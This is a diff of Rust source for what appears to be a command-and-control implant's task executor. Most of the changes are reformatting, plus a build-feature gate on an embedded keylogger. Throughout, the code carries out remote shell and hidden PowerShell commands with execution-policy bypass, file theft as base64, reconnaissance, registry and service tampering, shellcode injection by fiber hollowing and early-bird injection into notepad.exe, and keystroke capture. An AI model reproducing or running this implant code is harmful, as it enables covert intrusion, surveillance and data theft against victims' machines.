@@ -1,7 +1,7 @@
+use base64::{engine::general_purpose, Engine as _};
+use log::{debug, error, info};
 use nexus_common::*;
 use std::process::Command;
-use base64::{Engine as _, engine::general_purpose};
-use log::{debug, info, error};
 
 #[cfg(target_os = "windows")]
 use crate::fiber_execution::FiberExecutor;
@@ -12,10 +12,12 @@ use nexus_infra::bof_loader::{BOFLoader, BofArgument, LoadedBof};
 #[cfg(target_os = "windows")]
 use std::sync::{Arc, Mutex};
 
-
 // Embedded keylogger BOF data (will be populated by build system)
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", feature = "bof-loading"))]
 const KEYLOGGER_BOF_DATA: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/nexus_keylogger.o"));
+
+#[cfg(all(target_os = "windows", not(feature = "bof-loading")))]
+const KEYLOGGER_BOF_DATA: &[u8] = &[]; // Empty slice if BOF loading is not enabled
 
 // Keylogger state management
 #[cfg(target_os = "windows")]
@@ -66,19 +68,19 @@ impl TaskExecutor {
             "process_list" => self.list_processes().await,
             "system_info" => self.collect_system_info().await,
             "network_info" => self.collect_network_info().await,
-            
+
             // Fiber-based execution methods
             "fiber_shellcode" => self.execute_fiber_shellcode(&task_data).await,
             "fiber_hollowing" => self.execute_fiber_hollowing(&task_data).await,
             "early_bird_injection" => self.execute_early_bird_injection(&task_data).await,
-            
+
             #[cfg(target_os = "windows")]
             "registry_query" => self.query_registry(&task_data).await,
             #[cfg(target_os = "windows")]
             "registry_set" => self.set_registry(&task_data).await,
             #[cfg(target_os = "windows")]
             "service_control" => self.control_service(&task_data).await,
-            
+
             // Keylogger BOF operations
             #[cfg(target_os = "windows")]
             "keylogger_start" => self.execute_keylogger_start(&task_data).await,
@@ -88,33 +90,40 @@ impl TaskExecutor {
             "keylogger_status" => self.execute_keylogger_status(&task_data).await,
             #[cfg(target_os = "windows")]
             "keylogger_flush" => self.execute_keylogger_flush(&task_data).await,
-            
-            _ => Err(NexusError::TaskExecutionError(
-                format!("Unknown task type: {}", task_data.task_type)
-            )),
+
+            _ => Err(NexusError::TaskExecutionError(format!(
+                "Unknown task type: {}",
+                task_data.task_type
+            ))),
         }
     }
 
     async fn execute_shell_command(&self, task_data: &TaskData) -> Result<String> {
-        let command = task_data.parameters.get("command")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing command parameter".to_string()))?;
+        let command = task_data.parameters.get("command").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing command parameter".to_string())
+        })?;
 
         #[cfg(target_os = "windows")]
         let output = Command::new("cmd")
             .args(&["/C", command])
             .output()
-            .map_err(|e| NexusError::TaskExecutionError(format!("Command execution failed: {}", e)))?;
+            .map_err(|e| {
+                NexusError::TaskExecutionError(format!("Command execution failed: {}", e))
+            })?;
 
         #[cfg(target_os = "linux")]
         let output = Command::new("sh")
             .args(&["-c", command])
             .output()
-            .map_err(|e| NexusError::TaskExecutionError(format!("Command execution failed: {}", e)))?;
+            .map_err(|e| {
+                NexusError::TaskExecutionError(format!("Command execution failed: {}", e))
+            })?;
 
         let result = if output.status.success() {
             String::from_utf8_lossy(&output.stdout).to_string()
         } else {
-            format!("Error ({}): {}", 
+            format!(
+                "Error ({}): {}",
                 output.status.code().unwrap_or(-1),
                 String::from_utf8_lossy(&output.stderr)
             )
@@ -126,18 +135,29 @@ impl TaskExecutor {
     async fn execute_powershell_command(&self, task_data: &TaskData) -> Result<String> {
         #[cfg(target_os = "windows")]
         {
-            let command = task_data.parameters.get("command")
-                .ok_or_else(|| NexusError::TaskExecutionError("Missing command parameter".to_string()))?;
+            let command = task_data.parameters.get("command").ok_or_else(|| {
+                NexusError::TaskExecutionError("Missing command parameter".to_string())
+            })?;
 
             let output = Command::new("powershell")
-                .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command])
+                .args(&[
+                    "-WindowStyle",
+                    "Hidden",
+                    "-ExecutionPolicy",
+                    "Bypass",
+                    "-Command",
+                    command,
+                ])
                 .output()
-                .map_err(|e| NexusError::TaskExecutionError(format!("PowerShell execution failed: {}", e)))?;
+                .map_err(|e| {
+                    NexusError::TaskExecutionError(format!("PowerShell execution failed: {}", e))
+                })?;
 
             let result = if output.status.success() {
                 String::from_utf8_lossy(&output.stdout).to_string()
             } else {
-                format!("PowerShell Error ({}): {}", 
+                format!(
+                    "PowerShell Error ({}): {}",
                     output.status.code().unwrap_or(-1),
                     String::from_utf8_lossy(&output.stderr)
                 )
@@ -147,57 +167,80 @@ impl TaskExecutor {
         }
 
         #[cfg(not(target_os = "windows"))]
-        Err(NexusError::TaskExecutionError("PowerShell not available on this platform".to_string()))
+        Err(NexusError::TaskExecutionError(
+            "PowerShell not available on this platform".to_string(),
+        ))
     }
 
     async fn download_file(&self, task_data: &TaskData) -> Result<String> {
-        let file_path = task_data.parameters.get("path")
+        let file_path = task_data
+            .parameters
+            .get("path")
             .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;
 
         match std::fs::read(file_path) {
             Ok(content) => {
                 let encoded = general_purpose::STANDARD.encode(&content);
-                Ok(format!("File downloaded: {} bytes (base64: {})", content.len(), encoded))
+                Ok(format!(
+                    "File downloaded: {} bytes (base64: {})",
+                    content.len(),
+                    encoded
+                ))
             }
-            Err(e) => Err(NexusError::TaskExecutionError(format!("File read error: {}", e))),
+            Err(e) => Err(NexusError::TaskExecutionError(format!(
+                "File read error: {}",
+                e
+            ))),
         }
     }
 
     async fn upload_file(&self, task_data: &TaskData) -> Result<String> {
-        let file_path = task_data.parameters.get("path")
+        let file_path = task_data
+            .parameters
+            .get("path")
             .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;
-        
-        let content_b64 = task_data.parameters.get("content")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing content parameter".to_string()))?;
+
+        let content_b64 = task_data.parameters.get("content").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing content parameter".to_string())
+        })?;
 
         let content = general_purpose::STANDARD
             .decode(content_b64)
             .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;
 
         match std::fs::write(file_path, &content) {
-            Ok(_) => Ok(format!("File uploaded: {} bytes to {}", content.len(), file_path)),
-            Err(e) => Err(NexusError::TaskExecutionError(format!("File write error: {}", e))),
+            Ok(_) => Ok(format!(
+                "File uploaded: {} bytes to {}",
+                content.len(),
+                file_path
+            )),
+            Err(e) => Err(NexusError::TaskExecutionError(format!(
+                "File write error: {}",
+                e
+            ))),
         }
     }
 
     async fn list_directory(&self, task_data: &TaskData) -> Result<String> {
-        let dir_path = task_data.parameters.get("path")
+        let dir_path = task_data
+            .parameters
+            .get("path")
             .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;
 
         match std::fs::read_dir(dir_path) {
             Ok(entries) => {
                 let mut result = format!("Directory listing for {}:\n", dir_path);
-                
+
                 for entry in entries {
                     if let Ok(entry) = entry {
                         let metadata = entry.metadata().unwrap_or_else(|_| {
                             // Create a dummy metadata if we can't read it
                             std::fs::metadata(".").unwrap()
                         });
-                        
+
                         let file_type = if metadata.is_dir() { "DIR" } else { "FILE" };
                         let size = if metadata.is_dir() { 0 } else { metadata.len() };
-                        
+
                         result.push_str(&format!(
                             "{:<10} {:>10} {}\n",
                             file_type,
@@ -206,10 +249,13 @@ impl TaskExecutor {
                         ));
                     }
                 }
-                
+
                 Ok(result)
             }
-            Err(e) => Err(NexusError::TaskExecutionError(format!("Directory read error: {}", e))),
+            Err(e) => Err(NexusError::TaskExecutionError(format!(
+                "Directory read error: {}",
+                e
+            ))),
         }
     }
 
@@ -219,17 +265,18 @@ impl TaskExecutor {
             let output = Command::new("tasklist")
                 .args(&["/fo", "csv"])
                 .output()
-                .map_err(|e| NexusError::TaskExecutionError(format!("Process list failed: {}", e)))?;
+                .map_err(|e| {
+                    NexusError::TaskExecutionError(format!("Process list failed: {}", e))
+                })?;
 
             Ok(String::from_utf8_lossy(&output.stdout).to_string())
         }
 
         #[cfg(target_os = "linux")]
         {
-            let output = Command::new("ps")
-                .args(&["aux"])
-                .output()
-                .map_err(|e| NexusError::TaskExecutionError(format!("Process list failed: {}", e)))?;
+            let output = Command::new("ps").args(&["aux"]).output().map_err(|e| {
+                NexusError::TaskExecutionError(format!("Process list failed: {}", e))
+            })?;
 
             Ok(String::from_utf8_lossy(&output.stdout).to_string())
         }
@@ -237,7 +284,7 @@ impl TaskExecutor {
 
     async fn collect_system_info(&self) -> Result<String> {
         let mut info = String::new();
-        
+
         // Hostname
         if let Ok(hostname) = hostname::get() {
             info.push_str(&format!("Hostname: {}\n", hostname.to_string_lossy()));
@@ -247,16 +294,22 @@ impl TaskExecutor {
         #[cfg(target_os = "windows")]
         {
             if let Ok(output) = Command::new("systeminfo").output() {
-                info.push_str(&format!("System Info:\n{}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "System Info:\n{}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
         }
 
         #[cfg(target_os = "linux")]
         {
             if let Ok(output) = Command::new("uname").args(&["-a"]).output() {
-                info.push_str(&format!("System: {}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "System: {}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
-            
+
             if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
                 info.push_str(&format!("OS Release:\n{}\n", content));
             }
@@ -265,7 +318,11 @@ impl TaskExecutor {
         // Environment variables (filtered)
         info.push_str("Environment Variables:\n");
         for (key, value) in std::env::vars() {
-            if key.contains("PATH") || key.contains("USER") || key.contains("HOME") || key.contains("TEMP") {
+            if key.contains("PATH")
+                || key.contains("USER")
+                || key.contains("HOME")
+                || key.contains("TEMP")
+            {
                 info.push_str(&format!("  {}={}\n", key, value));
             }
         }
@@ -277,30 +334,42 @@ impl TaskExecutor {
         #[cfg(target_os = "windows")]
         {
             let mut info = String::new();
-            
+
             if let Ok(output) = Command::new("ipconfig").args(&["/all"]).output() {
-                info.push_str(&format!("IP Configuration:\n{}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "IP Configuration:\n{}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
-            
+
             if let Ok(output) = Command::new("netstat").args(&["-an"]).output() {
-                info.push_str(&format!("Network Connections:\n{}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "Network Connections:\n{}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
-            
+
             Ok(info)
         }
 
         #[cfg(target_os = "linux")]
         {
             let mut info = String::new();
-            
+
             if let Ok(output) = Command::new("ip").args(&["addr", "show"]).output() {
-                info.push_str(&format!("IP Addresses:\n{}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "IP Addresses:\n{}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
-            
+
             if let Ok(output) = Command::new("netstat").args(&["-tuln"]).output() {
-                info.push_str(&format!("Network Connections:\n{}\n", String::from_utf8_lossy(&output.stdout)));
+                info.push_str(&format!(
+                    "Network Connections:\n{}\n",
+                    String::from_utf8_lossy(&output.stdout)
+                ));
             }
-            
+
             Ok(info)
         }
     }
@@ -309,56 +378,78 @@ impl TaskExecutor {
     async fn execute_fiber_shellcode(&self, task_data: &TaskData) -> Result<String> {
         #[cfg(target_os = "windows")]
         {
-            let shellcode_b64 = task_data.parameters.get("shellcode")
-                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
-            
-            self.fiber_executor.execute_direct_fiber(shellcode_b64).await
+            let shellcode_b64 = task_data.parameters.get("shellcode").ok_or_else(|| {
+                NexusError::TaskExecutionError("Missing shellcode parameter".to_string())
+            })?;
+
+            self.fiber_executor
+                .execute_direct_fiber(shellcode_b64)
+                .await
         }
 
         #[cfg(not(target_os = "windows"))]
-        Err(NexusError::TaskExecutionError("Fiber execution not supported on this platform".to_string()))
+        Err(NexusError::TaskExecutionError(
+            "Fiber execution not supported on this platform".to_string(),
+        ))
     }
 
     async fn execute_fiber_hollowing(&self, task_data: &TaskData) -> Result<String> {
         #[cfg(target_os = "windows")]
         {
-            let shellcode_b64 = task_data.parameters.get("shellcode")
-                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
-            
-            let target_process = task_data.parameters.get("target_process")
-                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
-            
-            self.fiber_executor.execute_fiber_hollowing(shellcode_b64, target_process).await
+            let shellcode_b64 = task_data.parameters.get("shellcode").ok_or_else(|| {
+                NexusError::TaskExecutionError("Missing shellcode parameter".to_string())
+            })?;
+
+            let default_target = "C:\\Windows\\System32\\notepad.exe".to_string();
+            let target_process = task_data
+                .parameters
+                .get("target_process")
+                .unwrap_or(&default_target);
+
+            self.fiber_executor
+                .execute_fiber_hollowing(shellcode_b64, target_process)
+                .await
         }
 
         #[cfg(not(target_os = "windows"))]
-        Err(NexusError::TaskExecutionError("Fiber hollowing not supported on this platform".to_string()))
+        Err(NexusError::TaskExecutionError(
+            "Fiber hollowing not supported on this platform".to_string(),
+        ))
     }
 
     async fn execute_early_bird_injection(&self, task_data: &TaskData) -> Result<String> {
         #[cfg(target_os = "windows")]
         {
-            let shellcode_b64 = task_data.parameters.get("shellcode")
-                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
-            
-            let target_process = task_data.parameters.get("target_process")
-                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
-            
-            self.fiber_executor.execute_early_bird_fiber(shellcode_b64, target_process).await
+            let shellcode_b64 = task_data.parameters.get("shellcode").ok_or_else(|| {
+                NexusError::TaskExecutionError("Missing shellcode parameter".to_string())
+            })?;
+
+            let default_target = "C:\\Windows\\System32\\notepad.exe".to_string();
+            let target_process = task_data
+                .parameters
+                .get("target_process")
+                .unwrap_or(&default_target);
+
+            self.fiber_executor
+                .execute_early_bird_fiber(shellcode_b64, target_process)
+                .await
         }
 
         #[cfg(not(target_os = "windows"))]
-        Err(NexusError::TaskExecutionError("Early bird injection not supported on this platform".to_string()))
+        Err(NexusError::TaskExecutionError(
+            "Early bird injection not supported on this platform".to_string(),
+        ))
     }
 
     // Windows-specific registry operations
     #[cfg(target_os = "windows")]
     async fn query_registry(&self, task_data: &TaskData) -> Result<String> {
-        let key_path = task_data.parameters.get("key_path")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing key_path parameter".to_string()))?;
+        let key_path = task_data.parameters.get("key_path").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing key_path parameter".to_string())
+        })?;
 
         let mut cmd_args = vec!["query", key_path];
-        
+
         if let Some(value_name) = task_data.parameters.get("value_name") {
             cmd_args.extend(&["/v", value_name]);
         }
@@ -371,73 +462,90 @@ impl TaskExecutor {
         if output.status.success() {
             Ok(String::from_utf8_lossy(&output.stdout).to_string())
         } else {
-            Err(NexusError::TaskExecutionError(
-                format!("Registry query error: {}", String::from_utf8_lossy(&output.stderr))
-            ))
+            Err(NexusError::TaskExecutionError(format!(
+                "Registry query error: {}",
+                String::from_utf8_lossy(&output.stderr)
+            )))
         }
     }
 
     #[cfg(target_os = "windows")]
     async fn set_registry(&self, task_data: &TaskData) -> Result<String> {
-        let key_path = task_data.parameters.get("key_path")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing key_path parameter".to_string()))?;
-        
-        let value_name = task_data.parameters.get("value_name")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing value_name parameter".to_string()))?;
-        
-        let value_data = task_data.parameters.get("value_data")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing value_data parameter".to_string()))?;
-        
-        let value_type = task_data.parameters.get("value_type")
-            .unwrap_or(&"REG_SZ".to_string());
+        let key_path = task_data.parameters.get("key_path").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing key_path parameter".to_string())
+        })?;
+
+        let value_name = task_data.parameters.get("value_name").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing value_name parameter".to_string())
+        })?;
+
+        let value_data = task_data.parameters.get("value_data").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing value_data parameter".to_string())
+        })?;
+
+        let default_type = "REG_SZ".to_string();
+        let value_type = task_data
+            .parameters
+            .get("value_type")
+            .unwrap_or(&default_type);
 
         let output = Command::new("reg")
             .args(&[
-                "add", key_path,
-                "/v", value_name,
-                "/t", value_type,
-                "/d", value_data,
-                "/f"
+                "add", key_path, "/v", value_name, "/t", value_type, "/d", value_data, "/f",
             ])
             .output()
             .map_err(|e| NexusError::TaskExecutionError(format!("Registry set failed: {}", e)))?;
 
         if output.status.success() {
-            Ok(format!("Registry value set: {}\\{} = {}", key_path, value_name, value_data))
-        } else {
-            Err(NexusError::TaskExecutionError(
-                format!("Registry set error: {}", String::from_utf8_lossy(&output.stderr))
+            Ok(format!(
+                "Registry value set: {}\\{} = {}",
+                key_path, value_name, value_data
             ))
+        } else {
+            Err(NexusError::TaskExecutionError(format!(
+                "Registry set error: {}",
+                String::from_utf8_lossy(&output.stderr)
+            )))
         }
     }
 
     #[cfg(target_os = "windows")]
     async fn control_service(&self, task_data: &TaskData) -> Result<String> {
-        let service_name = task_data.parameters.get("service_name")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing service_name parameter".to_string()))?;
-        
-        let action = task_data.parameters.get("action")
-            .ok_or_else(|| NexusError::TaskExecutionError("Missing action parameter".to_string()))?;
+        let service_name = task_data.parameters.get("service_name").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing service_name parameter".to_string())
+        })?;
+
+        let action = task_data.parameters.get("action").ok_or_else(|| {
+            NexusError::TaskExecutionError("Missing action parameter".to_string())
+        })?;
 
         let output = Command::new("sc")
             .args(&[action, service_name])
             .output()
-            .map_err(|e| NexusError::TaskExecutionError(format!("Service control failed: {}", e)))?;
+            .map_err(|e| {
+                NexusError::TaskExecutionError(format!("Service control failed: {}", e))
+            })?;
 
         if output.status.success() {
-            Ok(format!("Service {} {}: {}", service_name, action, String::from_utf8_lossy(&output.stdout)))
-        } else {
-            Err(NexusError::TaskExecutionError(
-                format!("Service control error: {}", String::from_utf8_lossy(&output.stderr))
+            Ok(format!(
+                "Service {} {}: {}",
+                service_name,
+                action,
+                String::from_utf8_lossy(&output.stdout)
             ))
+        } else {
+            Err(NexusError::TaskExecutionError(format!(
+                "Service control error: {}",
+                String::from_utf8_lossy(&output.stderr)
+            )))
         }
     }
 
     // Keylogger BOF execution methods
     #[cfg(target_os = "windows")]
-    async fn execute_keylogger_start(&self, _task_data: &TaskData) -> Result<String> {        
+    async fn execute_keylogger_start(&self, _task_data: &TaskData) -> Result<String> {
         info!("Starting keylogger BOF");
-        
+
         let mut state = self.keylogger_state.lock().map_err(|e| {
             NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
         })?;
@@ -452,10 +560,13 @@ impl TaskExecutor {
                 Ok(loaded_bof) => {
                     info!("Keylogger BOF loaded successfully");
                     state.loaded_bof = Some(Arc::new(loaded_bof));
-                },
+                }
                 Err(e) => {
                     error!("Failed to load keylogger BOF: {}", e);
-                    return Err(NexusError::TaskExecutionError(format!("BOF load failed: {}", e)));
+                    return Err(NexusError::TaskExecutionError(format!(
+                        "BOF load failed: {}",
+                        e
+                    )));
                 }
             }
         }
@@ -463,8 +574,8 @@ impl TaskExecutor {
         if let Some(ref loaded_bof) = state.loaded_bof {
             // Create data callback closure
             let data_buffer = Arc::clone(&state.data_buffer);
-            let callback_ptr = Box::into_raw(Box::new(move |data: *const std::os::raw::c_char, length: u32| {
-                unsafe {
+            let callback_ptr = Box::into_raw(Box::new(
+                move |data: *const std::os::raw::c_char, length: u32| unsafe {
                     if !data.is_null() && length > 0 {
                         let slice = std::slice::from_raw_parts(data as *const u8, length as usize);
                         if let Ok(json_str) = String::from_utf8(slice.to_vec()) {
@@ -473,33 +584,41 @@ impl TaskExecutor {
                             }
                         }
                     }
-                }
-            })) as *mut _ as usize;
+                },
+            )) as *mut _ as usize;
 
             // Create arguments with callback pointer
             let args = vec![BofArgument::binary(callback_ptr.to_le_bytes().to_vec())];
 
             // Execute keylogger start function
-            match state.bof_loader.execute_bof(loaded_bof, "keylogger_start", &args) {
+            match state
+                .bof_loader
+                .execute_bof(loaded_bof, "keylogger_start", &args)
+            {
                 Ok(result) => {
                     state.is_active = true;
                     info!("Keylogger started successfully");
                     Ok(format!("Keylogger started: {}", result))
-                },
+                }
                 Err(e) => {
                     error!("Failed to start keylogger: {}", e);
-                    Err(NexusError::TaskExecutionError(format!("Keylogger start failed: {}", e)))
+                    Err(NexusError::TaskExecutionError(format!(
+                        "Keylogger start failed: {}",
+                        e
+                    )))
                 }
             }
         } else {
-            Err(NexusError::TaskExecutionError("Keylogger BOF not loaded".to_string()))
+            Err(NexusError::TaskExecutionError(
+                "Keylogger BOF not loaded".to_string(),
+            ))
         }
     }
 
     #[cfg(target_os = "windows")]
     async fn execute_keylogger_stop(&self, _task_data: &TaskData) -> Result<String> {
         info!("Stopping keylogger BOF");
-        
+
         let mut state = self.keylogger_state.lock().map_err(|e| {
             NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
         })?;
@@ -510,12 +629,15 @@ impl TaskExecutor {
 
         if let Some(ref loaded_bof) = state.loaded_bof {
             let args = vec![];
-            
-            match state.bof_loader.execute_bof(loaded_bof, "keylogger_stop", &args) {
+
+            match state
+                .bof_loader
+                .execute_bof(loaded_bof, "keylogger_stop", &args)
+            {
                 Ok(result) => {
                     state.is_active = false;
                     info!("Keylogger stopped successfully");
-                    
+
                     // Collect any remaining data
                     let collected_data = if let Ok(mut buffer) = state.data_buffer.lock() {
                         let data = buffer.join("\n");
@@ -524,54 +646,74 @@ impl TaskExecutor {
                     } else {
                         String::new()
                     };
-                    
-                    Ok(format!("Keylogger stopped: {}\nCollected data: {}", result, collected_data))
-                },
+
+                    Ok(format!(
+                        "Keylogger stopped: {}\nCollected data: {}",
+                        result, collected_data
+                    ))
+                }
                 Err(e) => {
                     error!("Failed to stop keylogger: {}", e);
-                    Err(NexusError::TaskExecutionError(format!("Keylogger stop failed: {}", e)))
+                    Err(NexusError::TaskExecutionError(format!(
+                        "Keylogger stop failed: {}",
+                        e
+                    )))
                 }
             }
         } else {
-            Err(NexusError::TaskExecutionError("Keylogger BOF not loaded".to_string()))
+            Err(NexusError::TaskExecutionError(
+                "Keylogger BOF not loaded".to_string(),
+            ))
         }
     }
 
     #[cfg(target_os = "windows")]
     async fn execute_keylogger_status(&self, _task_data: &TaskData) -> Result<String> {
         info!("Getting keylogger status");
-        
+
         let state = self.keylogger_state.lock().map_err(|e| {
             NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
         })?;
 
         if let Some(ref loaded_bof) = state.loaded_bof {
             let args = vec![];
-            
-            match state.bof_loader.execute_bof(loaded_bof, "keylogger_status", &args) {
+
+            match state
+                .bof_loader
+                .execute_bof(loaded_bof, "keylogger_status", &args)
+            {
                 Ok(result) => {
                     let buffer_count = if let Ok(buffer) = state.data_buffer.lock() {
                         buffer.len()
                     } else {
                         0
                     };
-                    
-                    Ok(format!("Status: {}\nAgent buffer count: {}", result, buffer_count))
-                },
+
+                    Ok(format!(
+                        "Status: {}\nAgent buffer count: {}",
+                        result, buffer_count
+                    ))
+                }
                 Err(e) => {
                     error!("Failed to get keylogger status: {}", e);
-                    Err(NexusError::TaskExecutionError(format!("Keylogger status failed: {}", e)))
+                    Err(NexusError::TaskExecutionError(format!(
+                        "Keylogger status failed: {}",
+                        e
+                    )))
                 }
             }
         } else {
-            Ok(format!("Keylogger BOF not loaded, active: {}", state.is_active))
+            Ok(format!(
+                "Keylogger BOF not loaded, active: {}",
+                state.is_active
+            ))
         }
     }
 
     #[cfg(target_os = "windows")]
     async fn execute_keylogger_flush(&self, _task_data: &TaskData) -> Result<String> {
         info!("Flushing keylogger data");
-        
+
         let state = self.keylogger_state.lock().map_err(|e| {
             NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
         })?;
@@ -579,7 +721,9 @@ impl TaskExecutor {
         // First flush data from BOF
         if let Some(ref loaded_bof) = state.loaded_bof {
             let args = vec![];
-            let _ = state.bof_loader.execute_bof(loaded_bof, "keylogger_flush", &args);
+            let _ = state
+                .bof_loader
+                .execute_bof(loaded_bof, "keylogger_flush", &args);
         }
 
         // Collect buffered data
@@ -589,7 +733,11 @@ impl TaskExecutor {
             } else {
                 let data = buffer.join("\n");
                 buffer.clear();
-                format!("Collected keylogger data ({} entries):\n{}", buffer.len(), data)
+                format!(
+                    "Collected keylogger data ({} entries):\n{}",
+                    buffer.len(),
+                    data
+                )
             }
         } else {
             "Failed to access data buffer".to_string()
@@ -636,10 +784,10 @@ mod tests {
     async fn test_shell_command_execution() {
         let executor = TaskExecutor::new();
         let mut params = HashMap::new();
-        
+
         #[cfg(target_os = "windows")]
         params.insert("command".to_string(), "echo test".to_string());
-        
+
         #[cfg(target_os = "linux")]
         params.insert("command".to_string(), "echo test".to_string());
 
@@ -672,7 +820,10 @@ mod tests {
 
         let result = executor.execute_task(task_data).await;
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("Unknown task type"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Unknown task type"));
     }
 
     #[cfg(target_os = "windows")]
@@ -690,6 +841,9 @@ mod tests {
 
         let result = executor.execute_fiber_shellcode(&task_data).await;
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("Missing shellcode parameter"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Missing shellcode parameter"));
     }
 }
